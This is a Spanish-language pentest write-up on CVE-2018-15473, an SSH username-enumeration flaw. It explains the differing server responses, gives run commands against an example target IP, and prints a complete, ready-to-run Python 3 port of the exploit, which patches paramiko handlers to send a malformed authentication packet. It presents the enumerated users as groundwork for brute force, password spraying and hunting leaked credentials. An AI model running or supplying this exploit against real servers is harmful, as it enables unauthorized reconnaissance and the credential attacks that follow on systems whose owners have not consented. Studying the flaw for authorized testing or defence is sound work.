# CVE-2018-15473 – Enumeración de usuarios SSH

## Información general

Este documento recoge la explotación de la vulnerabilidad **CVE-2018-15473**, que afecta al servicio SSH y permite enumerar usuarios válidos en un sistema remoto.  
El fallo se debe a la manera en que el servidor responde de forma diferente cuando el usuario existe o no durante el proceso de autenticación.

## Créditos

El exploit original fue desarrollado por **Matthew Daley, Justin Gardner y Lee David Painter**.  
Nuestra versión está **adaptada a Python 3** para que pueda ejecutarse en sistemas actuales sin necesidad de instalar Python 2.

## Contexto de la vulnerabilidad

Cuando realizamos una autenticación SSH, el servidor responde de forma distinta si el usuario no existe que si existe pero la clave es inválida. Esta diferencia en el flujo de mensajes permite realizar un ataque de enumeración de usuarios de manera remota.

Este tipo de vulnerabilidad se aprovecha en fases tempranas de un pentest, ya que conocer usuarios válidos nos ayuda posteriormente a realizar ataques de fuerza bruta, password spraying o a buscar credenciales filtradas en fuentes públicas.

## Dependencias

Antes de ejecutar el exploit debemos instalar `paramiko` en Python 3:

```bash
pip install paramiko
```

---

## Uso

La sintaxis básica es la siguiente:

```bash
python3 ssh_enum.py <target> -p <port> <username>
```

Ejemplo:

```bash
python3 ssh_enum.py 192.168.1.74 -p 22 root
```

- Si el usuario existe → `[+] root es un usuario válido
    
- Si el usuario no existe → `[-] root no es un usuario válido

---

## Script adaptado a Python 3

```python
#!/usr/bin/env python3
# CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Original credits: Matthew Daley, Justin Gardner, Lee David Painter
# Adaptado a Python3 para compatibilidad y uso actual

import argparse, logging, paramiko, socket, sys, os

class InvalidUsername(Exception):
    pass

# malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

# malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

# call when username was invalid
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# perform authentication with malicious packet and username
def check_user(username):
    sock = socket.socket()
    sock.connect((args.target, int(args.port)))
    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print('[!] Fallo en la conexión SSH')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        print(f"[-] {username} no es un usuario válido")
        sys.exit(3)
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[+] {username} es un usuario válido")

# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity) - Adaptado a Python3 por Metahumo')
parser.add_argument('target', help="Dirección IP del sistema objetivo")
parser.add_argument('-p', '--port', default=22, help="Introduce puerto SSH")
parser.add_argument('username', help="Usuario que se quiere validar")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

check_user(args.username)
```

---


---
